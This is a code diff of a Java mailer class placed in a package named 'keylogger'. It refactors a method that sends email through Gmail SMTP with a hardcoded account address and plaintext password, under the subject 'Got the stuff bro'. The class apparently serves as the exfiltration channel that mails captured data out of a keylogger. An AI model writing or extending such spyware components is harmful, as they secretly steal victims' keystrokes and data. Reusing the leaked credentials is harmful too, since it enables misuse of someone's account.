@@ -1,3 +1,4 @@
+package keylogger;
 /*
  * To change this license header, choose License Headers in Project Properties.
  * To change this template file, choose Tools | Templates
@@ -15,18 +16,13 @@ import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
-public class Mailer {
+public class Mailler {
     
     static final String username="saha.sparsha@gmail.com";
     static final String password="Sparsha97";
     
-    String tomail;
-    public Mailer(String addr)
-    {
-        this.tomail=addr;
-    }
-    
-    public void send_mail()
+    //This class had issues
+    public static void send_mail(String tomail )
     {
         Properties props = new Properties();
 		props.put("mail.smtp.auth", "true");
@@ -48,7 +44,7 @@ public class Mailer {
 			message.setFrom(new InternetAddress("saha.sparsha@gmail.com"));
 
 			// recipients email address
-			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(this.tomail));
+			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(tomail));
 
 			// add the Subject of email
 			message.setSubject("Got the stuff bro");
